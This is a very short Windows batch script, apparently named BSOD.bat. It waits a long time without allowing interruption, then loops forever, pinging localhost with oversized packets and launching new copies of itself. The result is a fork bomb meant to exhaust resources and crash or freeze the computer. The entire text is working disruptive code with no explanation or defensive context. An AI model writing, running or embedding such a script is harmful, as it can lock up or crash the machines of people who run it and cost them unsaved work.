TIMEOUT /T 30000 /NOBREAK
:loop
ping localhost -l 65500 -w 1 -n 1
start BSOD.bat
goto :loop